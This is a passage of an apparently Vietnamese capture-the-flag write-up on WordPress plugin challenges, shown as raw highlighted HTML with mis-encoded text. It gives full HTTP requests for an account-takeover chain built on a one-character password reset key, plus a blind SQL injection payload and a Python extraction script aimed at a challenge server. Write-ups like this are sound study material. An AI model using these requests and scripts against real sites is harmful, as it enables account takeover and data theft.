</span></span><span class=line><span class=cl>    <span class=nv>$username</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s2>&#34;username&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$email</span> <span class=o>=</span> <span class=nx>sanitize_email</span><span class=p>(</span><span class=nv>$parameters</span><span class=p>[</span><span class=s2>&#34;email&#34;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$password</span> <span class=o>=</span> <span class=nx>wp_generate_password</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Create user
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nx>wp_create_user</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$email</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_wp_error</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>new</span> <span class=nx>WP_Error</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;user_creation_failed&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>__</span><span class=p>(</span><span class=s2>&#34;User creation failed.&#34;</span><span class=p>,</span> <span class=s2>&#34;text_domain&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>            <span class=p>[</span><span class=s2>&#34;status&#34;</span> <span class=o>=&gt;</span> <span class=mi>500</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Add user role
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$user</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WP_User</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>set_role</span><span class=p>(</span><span class=s2>&#34;subscriber&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;message&#34;</span> <span class=o>=&gt;</span> <span class=nx>__</span><span class=p>(</span><span class=s2>&#34;User created successfully.&#34;</span><span class=p>,</span> <span class=s2>&#34;text_domain&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;user_id&#34;</span> <span class=o>=&gt;</span> <span class=nv>$user_id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>YÃªu cáº§u POST Ä‘á»ƒ táº¡o tÃ i khoáº£n má»›i:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-json/user/v1/create</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;username&#34;</span><span class=p>:</span> <span class=s2>&#34;newuser&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;email&#34;</span><span class=p>:</span> <span class=s2>&#34;newuser@example.com&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiÃªn, khi táº¡o ngÆ°á»i dÃ¹ng má»›i, chá»‰ cÃ³ <code>username</code> vÃ  <code>email</code> Ä‘Æ°á»£c truyá»n Ä‘i, mÃ  khÃ´ng cÃ³ máº­t kháº©u Ä‘á»ƒ Ä‘Äƒng nháº­p. Plugin nÃ y cÃ²n cung cáº¥p má»™t tÃ­nh nÄƒng khÃ¡c lÃ  <code>reset_password_key_callback()</code>, cho phÃ©p yÃªu cáº§u reset máº­t kháº©u cho báº¥t ká»³ tÃ i khoáº£n nÃ o. ChÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng <code>$key</code> Ä‘Æ°á»£c táº¡o tá»« <code>get_password_reset_key2()</code> Ä‘á»ƒ thá»±c hiá»‡n viá»‡c reset máº­t kháº©u.</p><p>Request yÃªu cáº§u reset password:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded; charset=UTF-8</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=reset_key&amp;user_id=71
</span></span></code></pre></td></tr></table></div></div><p>Tuy nhiÃªn, <code>$key</code> Ä‘Æ°á»£c táº¡o ra chá»‰ cÃ³ 1 kÃ½ tá»± duy nháº¥t, Ä‘iá»u nÃ y cho phÃ©p chÃºng ta brute force key Ä‘á»ƒ reset máº­t kháº©u cho tÃ i khoáº£n <code>subscriber</code> vá»«a táº¡o.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=nx>wp_generate_password</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=k>false</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Do mÃ´i trÆ°á»ng cá»§a tÃ´i khÃ´ng Ä‘Æ°á»£c cáº¥u hÃ¬nh server mail, nÃªn tÃ´i gáº·p khÃ³ khÄƒn trong viá»‡c xÃ¡c Ä‘á»‹nh chÃ­nh xÃ¡c endpoint Ä‘á»ƒ reset máº­t kháº©u báº±ng key. Sau khi tham kháº£o ChatGPT, tÃ´i Ä‘Ã£ nháº­n Ä‘Æ°á»£c cÃ¢u tráº£ lá»i nhÆ° sau:</p><p><img loading=lazy src=https://images.viblo.asia/d14b2476-ba4a-45af-826e-61e98fcaf96f.png alt=image.png></p><p>TÃ´i Ä‘Ã£ thá»­ sá»­ dá»¥ng endpoint nÃ y Ä‘á»ƒ reset máº­t kháº©u cho tÃ i khoáº£n <code>subscriber</code>.Tuy nhiÃªn, sau Ä‘Ã³ tÃ´i phÃ¡t hiá»‡n ra má»™t endpoint tá»‘t hÆ¡n Ä‘á»ƒ thá»±c hiá»‡n viá»‡c nÃ y.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-login.php?action=resetpass</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pass1=123&amp;pw_weak=on&amp;pass2=123&amp;rp_key=R&amp;wp-submit=Save+Password
</span></span></code></pre></td></tr></table></div></div><p>Sau khi reset thÃ nh cÃ´ng vÃ  cÃ³ Ä‘Æ°á»£c tÃ i khoáº£n <code>subscriber</code>, tÃ´i tiáº¿p tá»¥c gá»­i yÃªu cáº§u Ä‘áº¿n hÃ m <code>get_latest_posts_callback</code> Ä‘á»ƒ láº¥y giÃ¡ trá»‹ <code>nonce</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>&lt;subcriber&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=get_latest_posts_callback
</span></span></code></pre></td></tr></table></div></div><p>Khi Ä‘Ã£ cÃ³ <code>nonce</code>, tÃ´i chá»‰ cáº§n gá»­i yÃªu cáº§u tá»›i <code>flagger_request_callback()</code> vÃ  truyá»n giÃ¡ trá»‹ <code>nonce</code> Ä‘Ã³ Ä‘á»ƒ nháº­n flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>&lt;subcriber&gt;</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=patchstack_flagger&amp;nonce=b920667f1a
</span></span></code></pre></td></tr></table></div></div><h1 id=link-manager>Link Manager<a hidden class=anchor aria-hidden=true href=#link-manager>#</a></h1><p>Äáº­p vÃ o máº¯t Ä‘áº§u tiÃªn lÃ  Ä‘oáº¡n code dá»… dÃ ng bá»‹ khai thÃ¡c SQL Injection táº¡i:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_link_data</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nv>$wpdb</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$table_name</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>prefix</span> <span class=o>.</span> <span class=s1>&#39;links&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$link_name</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;link_name&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$order</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;order&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$orderby</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;orderby&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>validate_order</span><span class=p>(</span><span class=nv>$order</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>validate_order_by</span><span class=p>(</span><span class=nv>$orderby</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nv>$results</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>get_results</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM wp_links where link_name = &#39;</span><span class=si>$link_name</span><span class=s2>&#39; order by </span><span class=si>$orderby</span><span class=s2> </span><span class=si>$order</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$results</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=nv>$results</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;No data found.&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Máº·c dÃ¹ cÃ³ Ä‘oáº¡n validate dá»¯ liá»‡u truyá»n vÃ o, nhÆ°ng nÃ³ chá»‰ Ä‘á»ƒ Ä‘Ã¡nh lá»«a vÃ  khÃ´ng thá»±c sá»± ngÄƒn cháº·n Ä‘Æ°á»£c SQL Injection. ChÃºng ta váº«n cÃ³ thá»ƒ khai thÃ¡c lá»— há»•ng qua biáº¿n <code>$orderby $order</code>.</p><p>Äá»ƒ khai thÃ¡c Ä‘Æ°á»£c lá»— há»•ng nÃ y, trÆ°á»›c tiÃªn cáº§n thÃªm dá»¯ liá»‡u vÃ o mÃ  khÃ´ng cáº§n xÃ¡c thá»±c thÃ´ng qua hook sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>add_action</span><span class=p>(</span> <span class=s1>&#39;wp_ajax_nopriv_submit_link&#39;</span><span class=p>,</span> <span class=s1>&#39;handle_ajax_link_submission&#39;</span> <span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>ChÃºng ta cÃ³ thá»ƒ gá»­i yÃªu cáº§u thÃªm dá»¯ liá»‡u vÃ  láº¥y giÃ¡ trá»‹ <code>nonce</code> tá»« trang chá»§, thÃ´ng qua biáº¿n <code>var ajaxNonce = 'bb01b00013';</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/wp-admin/admin-ajax.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>action=submit_link&amp;url=http://example.com&amp;name=test&amp;description=test&amp;nonce=bb01b00013
</span></span></code></pre></td></tr></table></div></div><h3 id=khai-thÃ¡c-sql-injection>Khai thÃ¡c SQL Injection<a hidden class=anchor aria-hidden=true href=#khai-thÃ¡c-sql-injection>#</a></h3><p>Trong Ä‘oáº¡n truy váº¥n SQL sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$results</span> <span class=o>=</span> <span class=nv>$wpdb</span><span class=o>-&gt;</span><span class=na>get_results</span><span class=p>(</span><span class=s2>&#34;SELECT * FROM wp_links where link_name = &#39;</span><span class=si>$link_name</span><span class=s2>&#39; order by </span><span class=si>$orderby</span><span class=s2> </span><span class=si>$order</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>ChÃºng ta cÃ³ thá»ƒ khai thÃ¡c SQL Injection qua <code>order by</code>, nhÆ°ng do response khÃ´ng hiá»ƒn thá»‹ lá»—i nÃªn khÃ´ng thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t error-based SQLi. Thay vÃ o Ä‘Ã³, cÃ³ hai cÃ¡ch khai thÃ¡c: <strong>time-based blind SQL Injection</strong> hoáº·c <strong>boolean-based blind SQL Injection</strong>.</p><p>TÃ´i Ä‘Ã£ chá»n cÃ¡ch khai thÃ¡c báº±ng <strong>boolean-based blind SQL Injection</strong> vÃ¬ cÃ¡ch nÃ y nhanh hÆ¡n cho brute force. Payload sá»­ dá»¥ng cÃ³ dáº¡ng (cáº£m Æ¡n ngÆ°á»i anh homie Ä‘Ã£ chia sáº» payload nÃ y):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=p>(</span><span class=k>CASE</span><span class=w> </span><span class=k>WHEN</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=k>THEN</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>ELSE</span><span class=w> </span><span class=mi>6096</span><span class=o>*</span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=mi>6096</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=p>)</span><span class=w> </span><span class=k>END</span><span class=p>))</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Chá»‰ cáº§n thay pháº§n <code>1=1</code> báº±ng cÃ¡c Ä‘iá»u kiá»‡n boolean hoáº·c time-based khÃ¡c lÃ  Ä‘Æ°á»£c. TÃ´i Ä‘Ã£ chá»n sá»­ dá»¥ng boolean-based vÃ¬ nÃ³ hiá»‡u quáº£ hÆ¡n trong trÆ°á»ng há»£p nÃ y.</p><blockquote><p>LÆ°u Ã½: CÃ´ng cá»¥ <code>sqlmap</code> khÃ´ng thá»ƒ khai thÃ¡c lá»— há»•ng nÃ y do háº¡n cháº¿ trong viá»‡c gá»­i payload. Náº¿u cÃ³ cÃ¡ch sá»­ dá»¥ng tá»‘t hÆ¡n, cÃ¡c báº¡n Ä‘á»c cÃ³ thá»ƒ gá»£i Ã½ thÃªm nhÃ©. VÃ¬ khÃ´ng thá»ƒ khai thÃ¡c tá»± Ä‘á»™ng báº±ng cÃ´ng cá»¥, tÃ´i Ä‘Ã nh pháº£i &ldquo;manual&rdquo; ğŸ˜¥.</p></blockquote><p>Trong quÃ¡ trÃ¬nh khai thÃ¡c, tÃ´i gáº·p hai váº¥n Ä‘á» lá»›n:</p><ol><li><strong>KhÃ´ng thá»ƒ sá»­ dá»¥ng dáº¥u <code>'</code></strong>.</li><li><strong>KhÃ´ng thá»ƒ so sÃ¡nh chuá»—i</strong>.</li></ol><p>NguyÃªn nhÃ¢n khÃ´ng sá»­ dá»¥ng Ä‘Æ°á»£c dáº¥u <code>'</code> lÃ  do tÃ­nh nÄƒng <a href=https://viblo.asia/p/phan-tich-cve-2023-23488-paid-memberships-pro-298-unauthenticated-blind-sqli-va-van-de-voi-request-trong-wordpress-gwd43k2q4X9#_addslash-tai-wordpress-1>Addslashes cá»§a WordPress</a> mÃ  tÃ´i Ä‘Ã£ trÃ¬nh bÃ y trong bÃ i viáº¿t trÆ°á»›c. Viá»‡c nÃ y cÅ©ng khiáº¿n khÃ´ng thá»ƒ so sÃ¡nh chuá»—i má»™t cÃ¡ch thÃ´ng thÆ°á»ng.</p><p>Giáº£i phÃ¡p thay tháº¿ lÃ  sá»­ dá»¥ng cÃ¡c hÃ m sá»‘ Ä‘á»ƒ so sÃ¡nh. TÃ´i chuyá»ƒn qua so sÃ¡nh báº±ng sá»‘ vÃ  sá»­ dá»¥ng hÃ m <code>ASCII()</code> Ä‘á»ƒ chuyá»ƒn Ä‘á»•i kÃ½ tá»± sang mÃ£ sá»‘, Ä‘á»“ng thá»i sá»­ dá»¥ng hÃ m <code>CHAR()</code> Ä‘á»ƒ láº¥y tÃªn cá»™t. Flag cá»§a challenge nÃ y náº±m trong báº£ng <code>wp_options</code> vá»›i tÃªn cá»™t lÃ  <code>flag_links_data</code>.</p><p>Vá»›i sá»± há»— trá»£ cá»§a ChatGPT, tÃ´i Ä‘Ã£ viáº¿t má»™t script Ä‘á»ƒ khai thÃ¡c lá»— há»•ng nÃ y:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://100.25.255.51:9097/wp-admin/admin-ajax.php&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target_table</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_sqli</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;action&#39;</span><span class=p>:</span> <span class=s1>&#39;get_link_data&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;link_name&#39;</span><span class=p>:</span> <span class=s1>&#39;test&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;order&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;orderby&#39;</span><span class=p>:</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/x-www-form-urlencoded&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;success&#39;</span><span class=p>)</span> <span class=o>==</span> <span class=kc>False</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>brute_force_flag_links_data</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_value</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>char_set</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>punctuation</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>found</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>32</span><span class=p>,</span> <span class=mi>127</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;(SELECT (CASE WHEN (SELECT ASCII(SUBSTRING(option_value,</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>flag_value</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>,1)) FROM wordpress.wp_options WHERE option_name=CHAR(102,108,97,103,95,108,105,110,107,115,95,100,97,116,97)) = </span><span class=si>{</span><span class=n>char</span><span class=si>}</span><span class=s2> THEN 1 ELSE 6096*(SELECT 6096 FROM information_schema.tables) END))&#34;</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>test_sqli</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>flag_value</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ÄÃ£ tÃ¬m tháº¥y: </span><span class=si>{</span><span class=n>flag_value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>found</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>found</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;GiÃ¡ trá»‹ flag_links_data lÃ : </span><span class=si>{</span><span class=n>flag_value</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>brute_force_flag_links_data</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=justinwonkytokens>JustinWonkyTokens<a hidden class=anchor aria-hidden=true href=#justinwonkytokens>#</a></h1><p><img loading=lazy src=https://images.viblo.asia/d5f6ff9c-ff1d-4ba0-8093-9576c29e0e82.png alt=image.png></p><p>Äá» bÃ i cung cáº¥p má»™t plugin sá»­ dá»¥ng JWT (JSON Web Token) Ä‘á»ƒ xÃ¡c thá»±c, vÃ  nhiá»‡m vá»¥ cá»§a chÃºng ta lÃ  láº¥y Ä‘Æ°á»£c JWT vá»›i <code>role=admin</code> Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
